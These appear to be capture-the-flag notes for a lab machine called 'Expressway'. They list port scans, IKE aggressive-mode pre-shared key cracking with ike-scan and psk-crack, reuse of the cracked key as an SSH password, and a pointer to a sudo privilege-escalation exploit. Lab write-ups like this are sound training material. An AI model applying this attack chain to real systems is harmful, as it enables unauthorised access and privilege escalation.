# Expressway: Machine Notes

## Recon

### Nmap
- Port 22/tcp: SSH (OpenSSH 10.0p2)
- Port 500/udp: ISAKMP (VPN)

### Erlang RCE Check
- Checked for CVE-2025-32433 (Erlang-OTP SSH RCE), marked as potentially vulnerable but no direct shell achieved via tool.

## Initial Access

### IKE PSK Cracking
- Scanned for IKE (VPN) aggressive mode:
```bash
ike-scan -A --pskcrack 10.129.30.166
```
- Obtained ID: `ike@expressway.htb`.
- Cracked the PSK using `psk-crack` and `rockyou.txt`:
```bash
psk-crack crack -d /usr/share/wordlists/rockyou.txt [HASH]
```
- Cracked PSK: `freakingrockstarontheroad`.

### Foothold
- Used the cracked PSK as the password for the user identified in the IKE ID:
- Credentials: `ike` : `freakingrockstarontheroad`
```bash
ssh ike@expressway.htb
```

## Privilege Escalation

### Sudo Vulnerability (CVE-2025-32463)
- Ran `linpeas.sh` and identified Sudo version 1.9.17.
- Target is vulnerable to **CVE-2025-32463** (chwoot).
- Use the exploit to gain root privileges:
```bash
# Link to exploit repository found in notes
# https://github.com/pr0v3rbs/CVE-2025-32463_chwoot
```
